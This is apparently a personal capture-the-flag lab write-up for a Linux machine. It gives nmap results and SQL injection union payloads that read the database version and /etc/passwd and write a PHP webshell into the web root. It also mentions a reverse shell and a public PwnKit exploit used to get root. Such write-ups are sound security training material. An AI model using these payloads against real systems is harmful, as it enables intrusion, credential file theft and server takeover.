
## Lab Details
- Difficulty: Medium
- OS: Linux

## Summary
- Initial access: SQLi Union Attack
- Privilege escalation: PolKit LPE

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.96.75 -p80 -sC -sV -A
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-01 00:38 EDT
Nmap scan report for 10.129.96.75
Host is up (0.0023s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Foothold

#### Steps
- Visit target on port 80 we are presented with a page that has a check function
![[Pasted image 20260603110355.png]]
- Identified that there is a SQLi union on the `/index.php`
- We can get the version of target database using 
```
10' UNION SELECT @@version -- -
```
![[Pasted image 20260601154538.png]]
- Get the `/etc/passwd` file 
```
10' UNION SELECT LOAD_FILE("/etc/passwd") -- -
```
![[Pasted image 20260601154624.png]]
- Attempt to write a webshell to target using below payload 
```
10' union select '<?php system($_REQUEST["exec"]);?>' into outfile '/var/www/html/rce.php'
```
- Access the webshell at `http://target_ip/rce.php`
- Generate a reverse shell payload and execute in webshell to receive a reverse shell
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- This is machine is vulnerable to PolKit LPE - use https://github.com/ly4k/PwnKit to gain root access

## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: